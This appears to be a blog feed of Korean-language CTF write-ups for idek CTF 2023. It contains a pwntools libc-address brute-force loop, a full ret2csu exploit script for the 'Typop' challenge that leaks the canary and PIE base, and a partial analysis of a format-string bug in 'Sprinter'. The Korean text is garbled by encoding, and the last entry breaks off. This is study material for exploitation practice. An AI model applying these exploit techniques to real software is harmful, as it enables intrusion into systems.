payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - libc brute forcing in local (p.libcs())</title>
      <link href="/230119-pwn-libc_brute_forcing_in_local/"/>
      <url>/230119-pwn-libc_brute_forcing_in_local/</url>
      
        <content type="html"><![CDATA[<ul><li>Î°úÏª¨ÏóêÏÑú ÏõêÌïòÎäî Î¶ΩÏãú Ï£ºÏÜå Ïã§ÌñâÌï† ÎïåÍπåÏßÄ ÌäπÏ†ï Î∞îÏù¥Ìä∏ Î∏åÎ£®Ìä∏ Ìè¨Ïã±ÌïòÍ∏∞<ul><li><code>p.libcs()</code> Ïù¥Ïö©</li></ul></li><li>ÏÉÅÌô©<ul><li>8Î∞îÏù¥Ìä∏ Ï§ë ÏÉÅÏúÑ 5Î∞îÏù¥Ìä∏Îäî ÏïåÍ≥† ÏûàÍ≥†, ÌïòÏúÑ 1.5Î∞îÏù¥Ìä∏Îäî Ïò§ÌîÑÏÖãÏúºÎ°ú ÏïåÍ≥† ÏûàÎäî ÏÉÅÌô©. ÌïòÏßÄÎßå Ï§ëÍ∞Ñ 1.5Î∞îÏù¥Ìä∏Î•º Î™®Î•¥Í∏∞ ÎïåÎ¨∏Ïóê Ìï¥Îãπ Î∂ÄÎ∂Ñ Î∏åÎ£®Ìä∏ Ìè¨Ïã±Ïù¥ ÌïÑÏöîÌï® -&gt; <code>0x7fb877 ??? b01</code></li></ul></li><li>Ïû•Ï†ê<ul><li>Ï†ïÎãµÏù∏ Ï£ºÏÜåÎßåÏùÑ Ïù¥Ïö©ÌïòÏó¨ ÌéòÏù¥Î°úÎìúÎ•º Ï†ÑÏÜ°ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÎîîÎ≤ÑÍπÖ Ïãú Ïú†Î¶¨Ìï® (Îπ†Î¶Ñ)</li></ul></li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(p.libs())) <span class="comment"># print base</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>))</span><br><span class="line"></span><br><span class="line">        aslr = <span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>)[-<span class="number">6</span>:-<span class="number">3</span>] <span class="comment"># 0x7fb877 210 b01 -&gt; only get &#x27;210&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> aslr != <span class="string">&#x27;fff&#x27;</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># exploit code here !!</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><ul><li>Ï∂úÎ†• Í≤∞Í≥º</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/vuln&#x27;</span>: 4190208, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>: 140430248431616, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/ld-2.31.so&#x27;</span>: 140430250479616&#125;</span><br><span class="line">0x7fb877210b01</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (intend, CSU)</title>
      <link href="/230118-idekctf2023-typop2/"/>
      <url>/230118-idekctf2023-typop2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><p>ÏñºÎßà Ï†ÑÏóê Ïò¨Î†∏Îçò idek CTFÏóêÏÑúÏùò Typop Î¨∏Ï†úÎ•º Ïñ∏Ïù∏ÌÖêÏúºÎ°ú ÌíÄÏù¥ÌñàÎã§Îäî Í≤ÉÏùÑ ÌôïÏù∏ÌñàÎã§. ctftime Íµ¨Í≤ΩÌïòÎã§Í∞Ä Ïù¥ Î¨∏Ï†úÏùò Îã§Î•∏ ÌíÄÏù¥Î•º ÌôïÏù∏ÌïòÎ©¥ÏÑú ÏïåÍ≤åÎêòÏóàÎã§. ÎãπÏãúÏóî Í∏∏Ïù¥ Ï†úÌïú ÎïåÎ¨∏Ïóê <code>csu gadget</code>ÏùÑ ÏÇ¨Ïö© Î™ªÌïúÎã§Í≥† ÏÉùÍ∞ÅÌñàÎã§. ÌïòÏßÄÎßå Ïì∏Îç∞ ÏóÜÎäî ÌéòÏù¥Î°úÎìúÍ∞Ä ÏûàÏóàÍ≥† Ïù¥Í≤ÉÎßå ÏóÜÏúºÎ©¥ Í∏∏Ïù¥Í∞Ä Îî± ÎßûÏïÑÏÑú <code>csu gadget</code>ÏùÑ ÏÇ¨Ïö©ÌïòÏó¨ <code>win</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌï† Ïàò ÏûàÎã§.</p><p>Ïù¥ Î¨∏Ï†úÏóê ÎåÄÌïú Ï†ïÎ≥¥ÏôÄ Î∂ÑÏÑùÏùÄ Î©∞Ïπ† Ï†Ñ ÏûëÏÑ±Ìïú Í≤åÏãúÍ∏ÄÏùÑ ÌôïÏù∏ÌïòÏûê.</p><ul><li><a href="https://jiravvit.github.io/230116-idekctf2023-typop/">https://jiravvit.github.io/230116-idekctf2023-typop/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="csu-int-csu-call"><a href="#csu-int-csu-call" class="headerlink" title="csu_int, csu_call"></a>csu_int, csu_call</h3><img src="/images/230118-idekctf2023-typop2/Screenshot 2023-01-18 at 17.17.11.png" width=700/><br><p>ÏúÑ ÏÇ¨ÏßÑÏùò Í∞ÄÏ†ØÏùÑ ÏÇ¨Ïö©ÌïòÏó¨ ÎßåÎì† Ìï®ÏàòÎäî ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>ÏΩîÎìúÏóê Ï£ºÏÑùÏúºÎ°ú ÌëúÌòÑÎêòÏñ¥ ÏûàÎäî Î∂ÄÎ∂ÑÏù¥ Î∞îÎ°ú Ïì∏Îç∞ÏóÜÎäî ÌéòÏù¥Î°úÎìúÏù¥Îã§. Ïù¥ Î¨∏Ï†úÏóêÏÑú Ï†Ä ÏΩîÎìúÎäî ÌïÑÏöî ÏóÜÎã§.</p><p>ÌïúÌé∏, <code>csu gadget</code>ÏùÑ ÏÇ¨Ïö©ÌïòÍ∏∞ ÏúÑÌï¥ Í∞ÄÏû• Ï§ëÏöîÌïú Í≤ÉÏùÄ callÌï† Ï£ºÏÜåÍ∞Ä ÌïÑÏöîÌïòÎã§Îäî Í≤ÉÏù¥Îã§. ÏÇ¨ÏßÑÏùò ÏΩîÎìúÏóêÏÑ† <code> call [r15+rbx*8]</code>Í∞Ä Ïó¨Í∏∞Ïóê Ìï¥ÎãπÌïúÎã§. <code>rbx</code>Î•º 0ÏúºÎ°ú ÏÑ∏ÌåÖÌï† Í≤ÉÏù¥Í∏∞ ÎïåÎ¨∏Ïóê Í≤∞Íµ≠ <code>r15</code>Ïóê Ï†ÄÏû•Îêú Ï£ºÏÜåÍ∞Ä Ìò∏Ï∂úÎêúÎã§. Ïö∞Î¶¨Í∞Ä Ïã§ÌñâÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜåÎäî <code>win</code> Ìï®Ïàò Ï£ºÏÜåÏù¥Í∏∞ ÎïåÎ¨∏Ïóê Ïñ¥ÎîòÍ∞ÄÏóêÎã§Í∞Ä <code>win</code> Ìï®Ïàò Ï£ºÏÜåÎ•º Ï†ÅÏñ¥ÎÜìÍ≥† Í∑∏ Ï£ºÏÜåÎ•º <code>r15</code>Ïóê ÎÑ£Ïñ¥Ï§òÏïº ÌïúÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br></pre></td></tr></table></figure><p><code>canary</code> Îí§Ïóê <code>win</code> Ìï®Ïàò Ï£ºÏÜåÎ•º ÎÑ£Ïñ¥Ï§¨Îã§. ÏÇ¨Ï†ÑÏóê stack Ï£ºÏÜåÎ•º Íµ¨Ìï¥ÎÜ®ÏúºÎãà <code>win</code>Ìï®ÏàòÍ∞Ä Ï†ÄÏû•ÎêòÏñ¥ ÏûàÎäî stack Ï£ºÏÜåÎ•º Íµ¨Ìï† Ïàò ÏûàÎã§. ÌéòÏù¥Î°úÎìú Í∏ÄÏûê ÏàòÎèÑ Î¨∏Ï†úÏóêÏÑú Ï†úÌïú Í±∏ÏóàÎçò <code>0x5a</code>ÏôÄ ÎèôÏùºÌïòÎã§.</p><h2 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span> </span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) for csu_gadget</span></span><br><span class="line">win = pie_base + e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">csu_init = pie_base + <span class="number">0x14ca</span></span><br><span class="line">csu_call = pie_base + <span class="number">0x14b0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Sprinter (*FSB*)</title>
      <link href="/230117-idekctf2023-sprinter/"/>
      <url>/230117-idekctf2023-sprinter/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>I‚Äôve always found myself to be more of a distance runner than a sprinter, but sometimes you just have to sprint that final stretch.<br><code>nc sprinter.chal.idek.team 1337</code></p></blockquote><ul><li>[25 solves &#x2F; 489 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : ‚úì (value: 0xfe2ac7e4ac5ec700)</span><br><span class="line">NX                            : ‚úì </span><br><span class="line">PIE                           : ‚úò </span><br><span class="line">Fortify                       : ‚úò </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><p><code>canary</code>Í∞Ä Ï°¥Ïû¨ÌïúÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your string into my buffer, located at %p: &quot;</span>, buf);</span><br><span class="line">  fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = (<span class="type">size_t</span>)<span class="built_in">strchr</span>(buf, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x26</span> )</span><br><span class="line">      LODWORD(v0) = <span class="built_in">sprintf</span>(buf, buf); <span class="comment">// [*]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> ÏóêÏÑú <code>Format String Bug</code>Í∞Ä ÌÑ∞ÏßÑÎã§. ÏïàÌÉÄÍπùÍ≤åÎèÑ <code>n</code>ÏùÑ ÌïÑÌÑ∞ÎßÅÌïòÍ≥†, <code>sprintf(buf, buf)</code> ÌòïÏãùÏúºÎ°ú Î≤ÑÍ∑∏Í∞Ä Î∞úÏÉùÌïòÍ∏∞ ÎïåÎ¨∏Ïóê Î¨∏Ï†ú ÌíÄÍ∏∞ ÍµâÏû•Ìûà ÍπåÎã§Î°≠Îã§. ÌéòÏù¥Î°úÎìúÎ•º Ï†ÅÏñ¥ÎÜ®ÎäîÎç∞ Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ Ïã§Ìñâ(?)ÌïòÎ©¥ÏÑú ÎÇ¥Í∞Ä Ï†ÅÏñ¥ÎÜ®Îçò ÌéòÏù¥Î°úÎìúÍ∞Ä ÎçÆÌûê ÏàòÎèÑ ÏûàÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. </p><p>Î¨∏Ï†úÎ•º Î≥¥Î©∞ Í∞ÄÏû• Î®ºÏ†Ä ÏÉùÍ∞ÅÏù¥ Îì§ÏóàÎçò Í≤ÉÏùÄ <code>n</code>Ïù¥ ÌïÑÌÑ∞ÎßÅ ÎêòÏñ¥ ÏûàÎäîÎç∞ Ïñ¥ÎñªÍ≤å overflowÎ•º ÏùºÏúºÏºúÏÑú Ïñ¥ÎñªÍ≤å retÎ•º Î≥ÄÏ°∞ÌïòÎäêÎÉêÏòÄÎã§. ÎçîÏö±Ïù¥ canaryÍ∞Ä Ï°¥Ïû¨ÌñàÍ∏∞ ÎïåÎ¨∏Ïóê Ïù¥Í≤ÉÏùÑ Ïñ¥ÎñªÍ≤å Ïö∞ÌöåÌïòÍ±∞ÎÇò leakÌï† ÏßÄÎèÑ Í≥†ÎØºÏù¥ÏóàÎã§. ÌïòÏßÄÎßå Ïó¨Îü¨Í∞ÄÏßÄ ÌÖåÏä§Ìä∏Î•º ÏßÑÌñâÌïú Í≤∞Í≥º <code>%c</code> Îì±ÏùÑ Ïù¥Ïö©Ìï¥ÏÑú overflowÎ•º ÏâΩÍ≤å ÏùºÏúºÌÇ¨ Ïàò ÏûàÏóàÍ≥† canaryÎ•º ÎØ∏Î¶¨ Íµ¨Ìï¥ÎÜìÎäî Í≥ºÏ†ïÏù¥ ÌïÑÏöîÌïòÎã§Í≥† ÌåêÎã®ÌñàÎã§.</p><p>Ïù¥ Î¨∏Ï†úÍ∞Ä ÍπåÎã§Î°úÏö¥ Ï†êÏù¥ Ìïú Í∞ÄÏßÄ Îçî Ï°¥Ïû¨ÌïúÎã§. Î∞îÎ°ú ÌéòÏù¥Î°úÎìúÏùò Í∏∏Ïù¥ Ï†úÌïúÏù∏Îç∞, <code>strlen</code>ÏùÑ Ïù¥Ïö©Ìï¥ÏÑú ÌéòÏù¥Î°úÎìúÏùò Í∏∏Ïù¥Î•º Íµ¨ÌïòÍ≥† ÏûàÎã§. </p><p>Ïù¥ Î¨∏Ï†úÏùò ÌôòÍ≤ΩÏùÄ <code>Ubuntu 20.04</code>Ïù¥Î©∞ Îã§ÌñâÌûà ÏûëÎèôÌïòÎäî <code>one gadget</code>Ïù¥ Ï°¥Ïû¨ÌïúÎã§. (Î¨∏Ï†ú ÌååÏùºÏóê libcÍ∞Ä Ìï®Íªò Ìè¨Ìï®ÎêòÏñ¥ ÏûàÎã§.)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li><a href="https://uz56764.tistory.com/83">https://uz56764.tistory.com/83</a></li></ul><p>Í∏∞Í∞Ñ ÎÇ¥Ïóê Ïù¥ Î¨∏Ï†úÎ•º ÌíÄÏßÄ Î™ªÌñàÍ∏∞ ÎïåÎ¨∏Ïóê ÏúÑ Î∏îÎ°úÍ∑∏Î•º Ï∞∏Í≥†ÌïòÏó¨ Í≥µÎ∂ÄÎ•º ÏßÑÌñâÌñàÎã§.</p><h3 id="0-c"><a href="#0-c" class="headerlink" title="0. $[]%[]c"></a>0. <code>$[]%[]c</code></h3><p>ÎªòÌïòÍ≤å Ìó∑Í∞àÎ†∏Îçò Í∞úÎÖêÏù¥Îã§.. Ï†ïÌôïÌûàÎäî <code>$[offset]%[num]c</code>ÏúºÎ°ú Ï†ïÏùòÌïòÍ≥† Ïã∂Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100c\n&quot;</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïù¥Í≤ÉÏùò Ï∂úÎ†• Í≤∞Í≥ºÎäî Î¨¥ÏóáÏùºÍπå? 99Î≤à Í≥µÎ∞±ÏùÑ Ï∂úÎ†•ÌïòÍ≥† ÎßàÏßÄÎßâÏóê ‚ÄòA‚ÄôÎ•º Ï∂úÎ†•ÌïúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100s\n&quot;</span>, <span class="string">&quot;AA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏûêÎß§ÌíàÏúºÎ°ú Ïù¥Í≤ÉÏùò Ï∂úÎ†• Í≤∞Í≥ºÎäî 98Î≤à Í≥µÎ∞±ÏùÑ Ï∂úÎ†•ÌïòÍ≥† ÎßàÏßÄÎßâÏóê ‚ÄòAA‚ÄôÎ•º Ï∂úÎ†•ÌïúÎã§.</p><p><code>$[offset]</code>Ïùò ÏùòÎØ∏Îäî.. <code>FSB</code>ÏóêÏÑú ÎßéÏù¥ Î≥¥Îçò Î∞îÎ°ú Í∑∏Í±∞Îã§. offset Î≤àÏß∏Î•º Ï∞∏Ï°∞ÌïúÎã§. ÎßåÏïΩ <code>%10$264c</code>ÎùºÎ©¥ Î®ºÏ†Ä Í≥µÎ∞± 264Í∞úÎ•º Ï∂úÎ†•ÌïòÍ≥† 10Î≤àÏß∏ offsetÏùÑ Ï∞∏Ï°∞Ìïú Í∞íÏùÑ Ï∂úÎ†•Ìï† Í≤ÉÏù¥Îã§.</p><h3 id="1-Canary-Î≥¥Ï°¥"><a href="#1-Canary-Î≥¥Ï°¥" class="headerlink" title="1. Canary Î≥¥Ï°¥"></a>1. Canary Î≥¥Ï°¥</h3><p>Ï†úÏùº Î®ºÏ†Ä Ìï¥ÏïºÌï† ÏùºÏùÄ <code>canary</code>Î•º Î≥¥Ï°¥Ìï¥ÏïºÌïòÎäî Í≤ÉÏù¥Îã§. (Ïñ¥ÎñªÍ≤å Î≥¥Î©¥ Ïù¥ Î¨∏Ï†úÏùò ÌïµÏã¨Ïù¥ÎùºÍ≥†ÎèÑ Ìï† Ïàò ÏûàÍ≤†Îã§.) Í∑∏ Ï†ÑÏóê <code>canary</code> ÏßÅÏ†ÑÍπåÏßÄ ÎçÆÏñ¥Î≥¥Ïûê.</p><figure class="highlight 